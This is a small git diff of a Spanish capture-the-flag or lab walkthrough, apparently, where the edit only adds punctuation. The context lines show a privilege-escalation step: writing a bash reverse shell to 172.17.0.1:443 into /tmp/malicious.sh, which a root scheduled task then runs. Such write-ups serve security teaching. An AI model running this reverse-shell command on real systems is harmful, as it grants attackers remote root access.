@@ -90,5 +90,6 @@ vemos que este script ejecuta un archivo en ```/tmp/malicious.sh```, y nosotros 
 echo '#!/bin/bash
 bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"' > /tmp/malicious.sh
 ```
-Una vez ejecutado, y esperando hasta máximo 60 segundos, en la terminal que estabamos escuchando habremos ganado acceso al usuario root
+Una vez ejecutado, y esperando hasta máximo 60 segundos, en la terminal que estabamos escuchando habremos ganado acceso al usuario root.
+
 <img width="662" height="209" alt="image" src="https://github.com/user-attachments/assets/e777bf35-48da-44a6-9fe4-5760319cbaff" />
